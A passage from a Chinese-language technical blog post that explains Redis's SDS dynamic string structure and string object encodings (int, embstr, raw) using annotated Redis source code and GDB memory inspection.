<h4 id="SDS结构体各成员的作用"><a href="#SDS结构体各成员的作用" class="headerlink" title="SDS结构体各成员的作用"></a>SDS结构体各成员的作用<span id="jump2"></span></h4><ul>
<li>len: 表示buf数组中已使用的字节数(<strong>不包括’\0’</strong>)，即字符串长度。好处是获取字符串长度时间为O(1)</li>
<li>free: 表示buf数组中未使用的字节数。</li>
<li>buf: 用于保存字符串，遵循C风格字符串原则，以’\0’结尾。</li>
</ul>
<h4 id="创建给定C字符串的SDS场景，sdshdr结构体各成员初值是多少？"><a href="#创建给定C字符串的SDS场景，sdshdr结构体各成员初值是多少？" class="headerlink" title="创建给定C字符串的SDS场景，sdshdr结构体各成员初值是多少？"></a>创建给定C字符串的SDS场景，sdshdr结构体各成员初值是多少？<span id="jump3"></span></h4><p><strong>思考问题</strong>：写入一个字符串键key, 值为长度为5的字符串”Redis”，它的SDS表示中len, free, buf成员值各是多少？</p>
<p><strong>源码分析：</strong></p>
<p>1、Redis调用<code>sdsnew</code>创建一个包含给定C字符串的SDS，这里的initlen &#x3D; strlen(“Redis”) &#x3D; 5。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdsnew</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *init)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> initlen = (init == <span class="literal">NULL</span>) ? <span class="number">0</span> : <span class="built_in">strlen</span>(init);	<span class="comment">// 调用strlen获取长度</span></span><br><span class="line">    <span class="keyword">return</span> sdsnewlen(init, initlen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、再调用<code>sdsnewlen</code>，返回SDS。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdsnewlen</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *init, <span class="type">size_t</span> initlen)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sds遵循C风格字符串原则，以&#x27;\0&#x27;结尾，额外1字节不计数len</span></span><br><span class="line">    <span class="keyword">if</span> (init) &#123;</span><br><span class="line">        sh = zmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+initlen+<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sh = zcalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+initlen+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sh == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    sh-&gt;len = initlen;			<span class="comment">// len = strlen(init)</span></span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = <span class="number">0</span>;				<span class="comment">// 创建一个包含C字符串SDS场景，free = 0</span></span><br><span class="line">    <span class="keyword">if</span> (initlen &amp;&amp; init)</span><br><span class="line">        <span class="built_in">memcpy</span>(sh-&gt;buf, init, initlen);</span><br><span class="line">    sh-&gt;buf[initlen] = <span class="string">&#x27;\0&#x27;</span>;	<span class="comment">// sds遵循C风格字符串原则，以&#x27;\0&#x27;结尾，额外1字节不计入len</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span>*)sh-&gt;buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，创建给定C字符串的SDS场景：</p>
<ul>
<li><p>len的值为strlen(“Redis”) &#x3D; 5</p>
</li>
<li><p>free的值为0</p>
</li>
<li><p>buf的内容为 “Redis”, 以’\0’结尾，6字节大小</p>
</li>
</ul>
<p>SDS实例图：<br><img src="/2021/12/11/2021-12-11-redis-note-01-sds/image1.png"></p>
<p><strong>思考问题：</strong> 初始化SDS时free为啥给0？—— 平时使用字符串还是只读场景偏多，这样能节约空间。</p>
<p><strong>GDB验证：</strong></p>
<p>Redis是基于内存的数据库，可以通过GDB打印内存，查看这个key对应的SDS结构体，是否和源码分析结果一致：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) p server.db[0].dict.ht[0]</span><br><span class="line">$1 = &#123;table = 0x7f3008d40900, size = 4, sizemask = 3, used = 1&#125;</span><br><span class="line"></span><br><span class="line">(gdb) p *(struct redisObject *) (server.db[0].dict.ht[0].table[0].v)</span><br><span class="line">$2 = &#123;type = 0, encoding = 8, lru = 11494144, refcount = 1, ptr = 0x7f3008d40838&#125;</span><br><span class="line"># type = REDIS_STRING(0), encoding = REDIS_ENCODING_EMBSTR(8)</span><br><span class="line"></span><br><span class="line">(gdb) p  (*(robj *)server.db[0].dict.ht[0].table[0].v).ptr</span><br><span class="line">$3 = (void *) 0x7f3008d40838</span><br><span class="line"></span><br><span class="line">(gdb) p  (sds) 0x7f3008d40838</span><br><span class="line">$4 = (sds) 0x7f3008d40838 &quot;redis&quot;		# 存储字符串键的值</span><br><span class="line"></span><br><span class="line">(gdb) p *(struct sdshdr *)(0x7f3008d40838 - 0x8)			# len 4字节， free 4字节，减去8字节正好是struct sdshdr的首地址</span><br><span class="line">$5 = &#123;len = 5, free = 0, buf = 0x7f3008d40838 &quot;Redis&quot;&#125;  	# 和以上源码分析的SDS结构体内容一致</span><br></pre></td></tr></table></figure>

<p><strong>上述GDB调试操作的依据说明：</strong></p>
<ul>
<li><p>Redis将所有数据库保存在服务器状态<code>server</code>变量中，默认创建16个数据库，默认目标数据库为0号(db[0])</p>
</li>
<li><p>dict为数据库键空间，保存所有键值对，底层实现为哈希表，其中ht[0]存储key-value，ht[1]用于rehash</p>
</li>
<li><p>table类型为<code>dictEntry **</code>, 链地址法实现哈希表，table[0]不为NULL，说明这个key的hashcode % size的结果为0</p>
</li>
<li><p>ptr类型为void *。对于字符串键而言，ptr实际类型为char *，存储内容为”Redis”串，而不是struct sdshdr的首地址。</p>
</li>
</ul>
<p><strong>注：</strong>Redis并没有直接使用sds, list这些基本数据结构去实现数据库，而是在这些基本数据结构上构筑了一个<strong>对象系统</strong>，统一使用redisObject对象：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisObject</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> type:<span class="number">4</span>;			    <span class="comment">// 类型</span></span><br><span class="line">    <span class="type">unsigned</span> encoding:<span class="number">4</span>;			<span class="comment">// 编码</span></span><br><span class="line">    <span class="type">unsigned</span> lru:<span class="number">24</span>;				<span class="comment">// 记录对象最后一次被命令程序访问的时间</span></span><br><span class="line">    <span class="type">int</span> refcount;					<span class="comment">// 引用计数</span></span><br><span class="line">    <span class="type">void</span> *ptr;						<span class="comment">// 指向底层实现数据结构的指针</span></span><br><span class="line">&#125; robj;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ptr为void *泛型指针，指向底层实现的数据结构。void *是C语言实现泛型编程的常用手段。</p>
</li>
<li><p>type为对象类型。type属性设计目的很简单，因为仅通过ptr这个泛型指针无法获取这个对象真正的类型。对于字符串键，type值取0（REDIS_STRING）</p>
</li>
<li><p>encoding为编码类型。encoding属性设计目的在于，根据不同场景，为对象设置不同的底层数据结构实现来优化性能。此例中，encoding值取8(REDIS_ENCODING_EMBSTR)，表示编码方式为embstr。</p>
</li>
</ul>
<h3 id="SDS相较于C风格字符串的优点"><a href="#SDS相较于C风格字符串的优点" class="headerlink" title="SDS相较于C风格字符串的优点"></a>SDS相较于C风格字符串的优点<span id="jump4"></span></h3><ul>
<li><p>获取字符串长度的时间复杂度为O(1) （对于SDS来说，获取长度只需访问len成员）</p>
</li>
<li><p>杜绝缓冲区溢出问题</p>
</li>
<li><p>减少字符串修改时导致的内存重分配次数</p>
</li>
<li><p>二进制安全，除了能保存文本数据，还可以保存二进制数据</p>
</li>
</ul>
<h4 id="SDS的空间分配策略是如何杜绝缓冲区溢出问题的？"><a href="#SDS的空间分配策略是如何杜绝缓冲区溢出问题的？" class="headerlink" title="SDS的空间分配策略是如何杜绝缓冲区溢出问题的？"></a>SDS的空间分配策略是如何杜绝缓冲区溢出问题的？<span id="jump5"></span></h4><p>以SDS拼接函数<code>sdscat</code>为例，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdscat</span><span class="params">(sds s, <span class="type">const</span> <span class="type">char</span> *t)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> sdscatlen(s, t, <span class="built_in">strlen</span>(t));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sds <span class="title function_">sdscatlen</span><span class="params">(sds s, <span class="type">const</span> <span class="type">void</span> *t, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>;</span></span><br><span class="line">    <span class="type">size_t</span> curlen = sdslen(s);		<span class="comment">// 得到源字符串长度</span></span><br><span class="line"></span><br><span class="line">    s = sdsMakeRoomFor(s,len);		<span class="comment">// 拼接前检查s的剩余空间是否足够，如空间不足需先扩展空间</span></span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    sh = (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">    <span class="built_in">memcpy</span>(s+curlen, t, len);</span><br><span class="line">    sh-&gt;len = curlen+len;</span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = sh-&gt;<span class="built_in">free</span>-len;</span><br><span class="line">    s[curlen+len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，<code>sdscat</code>拼接字符串前，会先通过<code>sdsMakeRoomFor</code>检查s的剩余空间是否足够，<strong>如果空间不足，会先调用<code>realloc</code>扩展出足够空间后</strong>，再通过<code>memcpy</code>拼接字符串。 所以杜绝了缓冲区溢出问题。</p>
<h4 id="SDS是如何减少修改字符串时带来的内存重分配次数"><a href="#SDS是如何减少修改字符串时带来的内存重分配次数" class="headerlink" title="SDS是如何减少修改字符串时带来的内存重分配次数"></a>SDS是如何减少修改字符串时带来的内存重分配次数<span id="jump6"></span></h4><p>对于C字符串，每次增长或缩短操作，都会导致一次内存重分配，性能较差。</p>
<p>SDS中引入free属性，通过未使用空间，优化字符串的增长或缩短操作，减少内存重分配次数。</p>
<h4 id="字符串增长场景，SDS扩容策略"><a href="#字符串增长场景，SDS扩容策略" class="headerlink" title="字符串增长场景，SDS扩容策略"></a>字符串增长场景，SDS扩容策略<span id="jump7"></span></h4><p>对于字符串增长场景，REDIS采用空间预分配的思想，即不仅分配修改后的SDS必需的空间，<strong>还会额外分配一定的未使用空间</strong>。源码参考<code>sdsMakeRoomFor</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SDS_MAX_PREALLOC (1024 * 1024)</span></span><br><span class="line">sds <span class="title function_">sdsMakeRoomFor</span><span class="params">(sds s, <span class="type">size_t</span> addlen)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>, *<span class="title">newsh</span>;</span></span><br><span class="line">    <span class="type">size_t</span> <span class="built_in">free</span> = sdsavail(s);</span><br><span class="line">    <span class="type">size_t</span> len, newlen;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">free</span> &gt;= addlen) <span class="keyword">return</span> s;			<span class="comment">// 如果剩余空间足够直接返回</span></span><br><span class="line">	len = sdslen(s);</span><br><span class="line">	sh = (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">	newlen = (len+addlen);</span><br><span class="line">	<span class="keyword">if</span> (newlen &lt; SDS_MAX_PREALLOC)			<span class="comment">// 如修改后的SDS长度小于1M,realloc重新分配两倍空间</span></span><br><span class="line">   		newlen *= <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    	newlen += SDS_MAX_PREALLOC;			<span class="comment">// 如修改后的SDS长度大于等于1M, realloc重新分配1M的空间</span></span><br><span class="line">	newsh = zrealloc(sh, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+newlen+<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (newsh == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	newsh-&gt;<span class="built_in">free</span> = newlen - len;</span><br><span class="line">	<span class="keyword">return</span> newsh-&gt;buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，额外分配的未使用空间大小由修改后的SDS长度决定：</p>
<ul>
<li>如果对SDS修改后，SDS长度(即len属性的值)小于1MB，REDIS会额外分配len个字节的空间。例如，给定SDS串s(“hello”)，调用sdscat(s, “world”)之后，len &#x3D; 10，free &#x3D; 10, buf数组大小变为 10 + 10 + 1 &#x3D; 21字节。</li>
<li>如果对SDS修改后，SDS长度大于等于1MB， REDIS只额外分配1MB的空间，目的是避免内存出现太大的浪费。</li>
</ul>
<p>相比C风格字符串，<strong>SDS的扩容策略将增长N次字符串需要的内存重分配次数从N次降低为最多N次</strong>。</p>
<p>GDB验证结果如下，和分析源码得出的结论一致：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key hello</span><br><span class="line">[OOK</span><br><span class="line">(gdb) p *(struct sdshdr *)((*(robj *)server.db[0].dict.ht[0].table[3].v).ptr - 0x8)</span><br><span class="line">$1 = &#123;len = 5, free = 0, buf = 0x7f571f1407f8 &quot;hello&quot;&#125;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; APPEND key world</span><br><span class="line">(integer) 10</span><br><span class="line">(gdb) p *(struct sdshdr *)((*(robj *)server.db[0].dict.ht[0].table[3].v).ptr - 0x8)</span><br><span class="line">$2 = &#123;len = 10, free = 10, buf = 0x7f571f1407e8 &quot;helloworld&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符串缩短场景，SDS空间释放策略"><a href="#字符串缩短场景，SDS空间释放策略" class="headerlink" title="字符串缩短场景，SDS空间释放策略"></a>字符串缩短场景，SDS空间释放策略<span id="jump8"></span></h4><p>对于字符串缩短场景，REDIS采用惰性空间释放策略，即并不立即回收空闲内存，而是仅使用free属性记录空闲字节数，如果将来需对SDS做增长操作，可以直接使用这部分空闲内存，无需做内存重分配。</p>
<p>源码分析：<code>sdsclear</code>用于清空SDS保存的字符串内容，采用惰性空闲释放策略，复杂度仅为O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sdsclear</span><span class="params">(sds s)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span> =</span> (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">    sh-&gt;<span class="built_in">free</span> += sh-&gt;len;</span><br><span class="line">    sh-&gt;len = <span class="number">0</span>;</span><br><span class="line">    sh-&gt;buf[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，REDIS提供API <code>sdsRemoveFreeSpace</code>，通过realloc仅分配实际大小的内存，真正地回收空闲内存，解决惰性空间释放策略带来的内存浪费问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdsRemoveFreeSpace</span><span class="params">(sds s)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>;</span></span><br><span class="line">    sh = (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">    sh = zrealloc(sh, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+sh-&gt;len+<span class="number">1</span>);	<span class="comment">// 仅分配实际大小的内存</span></span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = <span class="number">0</span>;										<span class="comment">// free写0</span></span><br><span class="line">    <span class="keyword">return</span> sh-&gt;buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SDS最大长度是多少？"><a href="#SDS最大长度是多少？" class="headerlink" title="SDS最大长度是多少？"></a>SDS最大长度是多少？<span id="jump9"></span></h3><p>Redis 3.0</p>
<ul>
<li><p>struct sdshdr的len成员记录SDS长度，类型为int，4字节，理论上最大长度 2^32 &#x2F; 2^10 &#x2F; 2^10 &#x3D; 4096MB</p>
</li>
<li><p>在set, append操作中通过硬编码写死字符串的最大长度为512MB，超过这个长度会报错，源码参考<code>checkStringLength</code>。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">checkStringLength</span><span class="params">(redisClient *c, <span class="type">long</span> <span class="type">long</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">512</span>*<span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">        addReplyError(c,<span class="string">&quot;string exceeds maximum allowed size (512MB)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> REDIS_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综上， Redis 3.0中SDS最大长度为 512MB。</p>
<p>Redis 6.0.10</p>
<ul>
<li>通过配置项<code>proto-max-bulk-len</code>指定SDS长度，默认是512MB，用户可以自行配置这个值，这点和Redis 3.0有区别。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">checkStringLength</span><span class="params">(client *c, <span class="type">long</span> <span class="type">long</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(c-&gt;flags &amp; CLIENT_MASTER) &amp;&amp; size &gt; server.proto_max_bulk_len) &#123;</span><br><span class="line">        addReplyError(c,<span class="string">&quot;string exceeds maximum allowed size (proto-max-bulk-len)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> C_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> C_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综上， Redis 6.0中SDS最大长度默认为512MB，用户可以自行配置这个值。</p>
<h3 id="字符串键的三种编码方式"><a href="#字符串键的三种编码方式" class="headerlink" title="字符串键的三种编码方式"></a>字符串键的三种编码方式<span id="jump10"></span></h3><p>Redis中字符串对象有三种编码，分别是int , embstr, raw。以下分别介绍这三种编码：</p>
<h4 id="int编码"><a href="#int编码" class="headerlink" title="int编码"></a>int编码<span id="jump11"></span></h4><p>如果一个字符串对象保存的内容是整数值，且这个整数可以用long表示，Redis就把它的编码设置为int</p>
<p>举例：执行 set key “123”命令，会创建一个int编码的字符串对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key 123</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;int&quot;</span><br></pre></td></tr></table></figure>

<p>内存中的<code>redisObject</code>对象内容如下：</p>
<p><img src="/2021/12/11/2021-12-11-redis-note-01-sds/image2.png"></p>
<p>int类型编码的字符串，要求整数落在long的范围内。在64位环境上，long范围：-9223372036854775808～+9223372036854775807，不同的键值和编码结果参考下表：</p>
<table>
<thead>
<tr>
<th align="left">键值</th>
<th align="left">编码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">+123</td>
<td align="left">embstr</td>
</tr>
<tr>
<td align="left">-123</td>
<td align="left">int</td>
</tr>
<tr>
<td align="left">–123</td>
<td align="left">embstr</td>
</tr>
<tr>
<td align="left">-9223372036854775808</td>
<td align="left">int</td>
</tr>
<tr>
<td align="left">-9223372036854775809</td>
<td align="left">embstr</td>
</tr>
<tr>
<td align="left">9223372036854775807</td>
<td align="left">int</td>
</tr>
<tr>
<td align="left">9223372036854775808</td>
<td align="left">embstr</td>
</tr>
</tbody></table>
<p><strong>源码分析：</strong></p>
<p><code>createStringObjectFromLongLong</code>根据传入的long long类型的整数值，创建一个字符串对象。如果入参在long范围之内，就创建int编码的字符串对象，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REDIS_SHARED_INTEGERS 10000</span></span><br><span class="line">robj *<span class="title function_">createStringObjectFromLongLong</span><span class="params">(<span class="type">long</span> <span class="type">long</span> value)</span> &#123;</span><br><span class="line">    robj *o;</span><br><span class="line">    <span class="comment">// value 的大小在 0 - 10000之间，直接返回一个共享对象</span></span><br><span class="line">    <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt; REDIS_SHARED_INTEGERS) &#123;</span><br><span class="line">        incrRefCount(shared.integers[value]);</span><br><span class="line">        o = shared.integers[value];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 如果在long范围内，就创建编码为int的字符串</span></span><br><span class="line">        <span class="keyword">if</span> (value &gt;= LONG_MIN &amp;&amp; value &lt;= LONG_MAX) &#123;</span><br><span class="line">            o = createObject(REDIS_STRING, <span class="literal">NULL</span>);</span><br><span class="line">            o-&gt;encoding = REDIS_ENCODING_INT;</span><br><span class="line">            o-&gt;ptr = (<span class="type">void</span>*)((<span class="type">long</span>)value);	<span class="comment">// ptr实际指向一个long类型的value</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果在long之外，就创建一个编码为embstr的字符串</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            o = createObject(REDIS_STRING,sdsfromlonglong(value));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="REDIS中的对象共享机制"><a href="#REDIS中的对象共享机制" class="headerlink" title="REDIS中的对象共享机制"></a>REDIS中的对象共享机制</h4><p>Redis服务器初始化的时候，会预先创建1万个字符串对象 (0 ~ 9999), 当服务器需要使用值为 0 - 9999的字符串对象时，服务器会直接使用这些共享对象，而不是去新创建一个对象。这个用意在于节约内存。</p>
<p><strong>举例：</strong></p>
<p>创建字符串键A，B，值都写“1”, 那么这两个键共享同一个redisObject对象，且这个redisObject对象的ptr指向的内容为1</p>
<p><strong>GDB验证结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb)  p *(robj *)server.db[0].dict.ht[0].table[0].v</span><br><span class="line">$15 = &#123;type = 0, encoding = 1, lru = 11668863, refcount = 3, ptr = 0x1&#125;</span><br><span class="line">(gdb)  p *(robj *)server.db[0].dict.ht[0].table[2].v</span><br><span class="line">$16 = &#123;type = 0, encoding = 1, lru = 11668863, refcount = 3, ptr = 0x1&#125;</span><br><span class="line">(gdb)  p &amp;(*(robj *)server.db[0].dict.ht[0].table[0].v)</span><br><span class="line">$17 = (robj *) 0x7fa7c1457360</span><br><span class="line">(gdb)  p &amp;(*(robj *)server.db[0].dict.ht[0].table[2].v)</span><br><span class="line">$18 = (robj *) 0x7fa7c1457360		# 和$17相同，都是0x7fa7c1457360，说明这是一个共享对象</span><br></pre></td></tr></table></figure>

<p>此时，两个key和共享字符串对象的内存示意图：</p>
<p><img src="/2021/12/11/2021-12-11-redis-note-01-sds/image3.png"></p>
<h4 id="raw编码"><a href="#raw编码" class="headerlink" title="raw编码"></a>raw编码<span id="jump13"></span></h4><p>如果字符串对象保存的是一个字符串值，且这个字符串长度大于39个字节，REDIS就使用SDS存储这个字符串，并设置编码类型为raw。</p>
<p><strong>举例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key 1234567891234567891234567891234567891234</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding ket</span><br><span class="line">&quot;raw&quot;</span><br><span class="line">127.0.0.1:6379&gt; strlen key</span><br><span class="line">(integer) 40</span><br></pre></td></tr></table></figure>

<p>raw编码的字符串示意图：</p>
<p><img src="/2021/12/11/2021-12-11-redis-note-01-sds/image4.png"></p>
<p><strong>源码分析：</strong></p>
<p><code>createStringObject</code>用于创建一个SDS表示的字符串对象。当字符串长度大于39字节时使用raw编码， 否则用embstr编码，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The current limit of 39 is chosen so that the biggest string object</span></span><br><span class="line"><span class="comment"> * we allocate as EMBSTR will still fit into the 64 byte arena of jemalloc. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REDIS_ENCODING_EMBSTR_SIZE_LIMIT 39</span></span><br><span class="line">robj *<span class="title function_">createStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= REDIS_ENCODING_EMBSTR_SIZE_LIMIT)</span><br><span class="line">        <span class="keyword">return</span> createEmbeddedStringObject(ptr,len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> createRawStringObject(ptr,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">robj *<span class="title function_">createRawStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> createObject(REDIS_STRING,sdsnewlen(ptr,len));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">robj *<span class="title function_">createObject</span><span class="params">(<span class="type">int</span> type, <span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">    robj *o = zmalloc(<span class="keyword">sizeof</span>(*o));</span><br><span class="line">    o-&gt;type = type;</span><br><span class="line">    o-&gt;encoding = REDIS_ENCODING_RAW;	<span class="comment">// 设置编码类型为raw</span></span><br><span class="line">    o-&gt;ptr = ptr;</span><br><span class="line">    o-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">    o-&gt;lru = LRU_CLOCK();</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="embstr编码"><a href="#embstr编码" class="headerlink" title="embstr编码"></a>embstr编码<span id="jump12"></span></h4><p>如果字符串对象保存的是一个字符串值，且这个字符串长度小于等于39个字节，REDIS就使用SDS存储这个字符串，并设置编码类型为embstr，<strong>embstr是专门用于保存短字符串的一种优化编码方式。</strong></p>
<p><strong>举例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set key hello</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;embstr&quot;</span><br></pre></td></tr></table></figure>

<p>和raw编码类似，embstr编码也使用<code>redisObject</code>和<code>sdshdr</code>保存字符串，但差别在于：</p>
<ul>
<li>raw编码需调用<strong>2</strong>次malloc创建<code>redisObject</code>和<code>sdshdr</code>对象，且<code>redisObject</code>和<code>sdshdr</code>内存不连续</li>
<li>而embstr编码只需<strong>1</strong>次malloc创建<code>redisObject</code>和<code>sdshdr</code>对象，且<code>redisObject</code>和<code>sdshdr</code>内存是连续的</li>
</ul>
<p>GDB查看embstr编码字符串的内存：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) p &amp;(*(robj *)server.db[0].dict.ht[0].table[3].v)</span><br><span class="line">$1 = (robj *) 0x7f43ebd3b9c0</span><br><span class="line">(gdb) p *(robj *)server.db[0].dict.ht[0].table[3].v</span><br><span class="line">$2 = &#123;type = 0, encoding = 8, lru = 11755503, refcount = 1, ptr = 0x7f43ebd3b9d8&#125;</span><br><span class="line">(gdb) p *(struct sdshdr *)0x7f43ebd3b9d0</span><br><span class="line">$3 = &#123;len = 5, free = 0, buf = 0x7f43ebd3b9d8 &quot;hello&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>观察结果发现robj和sdshdr内存确实是连续的，embstr编码的内存示意图：</p>
<p><img src="/2021/12/11/2021-12-11-redis-note-01-sds/image5.png"></p>
<p><strong>源码分析：</strong></p>
<p><code>createEmbeddedStringObject</code>用于创建一个embstr编码的字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">createEmbeddedStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    robj *o = zmalloc(<span class="keyword">sizeof</span>(robj)+<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+len+<span class="number">1</span>); <span class="comment">// 仅1次malloc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span> =</span> (<span class="type">void</span>*)(o+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    o-&gt;type = REDIS_STRING;</span><br><span class="line">    o-&gt;encoding = REDIS_ENCODING_EMBSTR;</span><br><span class="line">    o-&gt;ptr = sh+<span class="number">1</span>;</span><br><span class="line">    o-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">    o-&gt;lru = LRU_CLOCK();</span><br><span class="line"></span><br><span class="line">    sh-&gt;len = len;</span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ptr) &#123;</span><br><span 